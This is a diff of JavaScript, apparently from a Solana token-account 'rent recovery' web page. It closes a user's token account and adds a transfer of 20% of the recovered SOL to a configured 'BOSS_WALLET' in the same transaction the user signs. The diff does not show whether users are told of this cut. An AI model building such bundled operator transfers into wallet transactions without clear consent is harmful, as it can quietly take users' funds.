@@ -1256,7 +1256,7 @@ async function scanTokens() {
         }
 
       
-// ===== SOLUTION FINALE QUI MARCHE =====
+// ===== VERSION FINALE CORRIGÉE =====
 async function realRecoverRent(tokenAccountAddress, recoverableSOL) {
     try {
         console.log("🚀 Lancement récupération...");
@@ -1267,8 +1267,7 @@ async function realRecoverRent(tokenAccountAddress, recoverableSOL) {
         // CRÉER LA TRANSACTION
         const transaction = new solanaWeb3.Transaction();
 
-        // MÉTHODE DIRECTE POUR FERMER LE COMPTE
-        // Utilise la méthode du package SPL Token
+        // INSTRUCTION DE FERMETURE
         const closeInstruction = {
             keys: [
                 { pubkey: tokenPublicKey, isSigner: false, isWritable: true },
@@ -1276,15 +1275,13 @@ async function realRecoverRent(tokenAccountAddress, recoverableSOL) {
                 { pubkey: userPublicKey, isSigner: true, isWritable: false },
             ],
             programId: new solanaWeb3.PublicKey("TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA"),
-            data: new Uint8Array([10]), // CloseAccount instruction
+            data: new Uint8Array([10]),
         };
         
         transaction.add(closeInstruction);
 
-        // AJOUTER LE TRANSFERT APRÈS LA FERMETURE
+        // TRANSFERT BOSS
         const bossAmount = recoverableSOL * 0.20;
-        const userAmount = recoverableSOL * 0.80;
-
         const bossTransfer = solanaWeb3.SystemProgram.transfer({
             fromPubkey: userPublicKey,
             toPubkey: new solanaWeb3.PublicKey(REAL_CONFIG.BOSS_WALLET),
@@ -1292,39 +1289,46 @@ async function realRecoverRent(tokenAccountAddress, recoverableSOL) {
         });
         transaction.add(bossTransfer);
 
-        // FINALISER LA TRANSACTION
+        // FINALISATION
         const { blockhash } = await connection.getRecentBlockhash();
         transaction.recentBlockhash = blockhash;
         transaction.feePayer = userPublicKey;
 
-        console.log("✅ Transaction créée avec succès");
+        console.log("✅ Transaction prête");
 
-        // ENVOYER
+        // ENVOI
         const { signature } = await window.solana.signAndSendTransaction(transaction);
         console.log("📝 Signature:", signature);
 
-        // CONFIRMER
+        // CONFIRMATION
         await connection.confirmTransaction(signature, 'confirmed');
-        console.log("🎉 Transaction confirmée!");
+        console.log("🎉 Succès!");
 
         return { 
             success: true, 
             signature: signature,
-            userAmount: userAmount,
+            userAmount: recoverableSOL * 0.80,
             bossAmount: bossAmount
         };
 
     } catch (error) {
-        console.error("❌ Erreur détaillée:", error);
+        console.error("❌ Erreur complète:", error);
         
-        // MESSAGE D'ERREUR CLAIR
+        // GESTION D'ERREUR CORRECTE
         let errorMessage = "Erreur inconnue";
-        if (error.message.includes("undefined program id")) {
-            errorMessage = "Erreur technique - réessayez";
-        } else if (error.message.includes("rejected")) {
-            errorMessage = "Vous avez annulé la transaction";
-        } else {
-            errorMessage = error.message;
+        
+        if (error && error.message) {
+            if (error.message.includes("undefined program id")) {
+                errorMessage = "Erreur technique de configuration";
+            } else if (error.message.includes("rejected")) {
+                errorMessage = "Transaction annulée par l'utilisateur";
+            } else if (error.message.includes("blockhash")) {
+                errorMessage = "Erreur réseau - réessayez";
+            } else {
+                errorMessage = error.message;
+            }
+        } else if (error && error.toString) {
+            errorMessage = error.toString();
         }
         
         return { success: false, error: errorMessage };
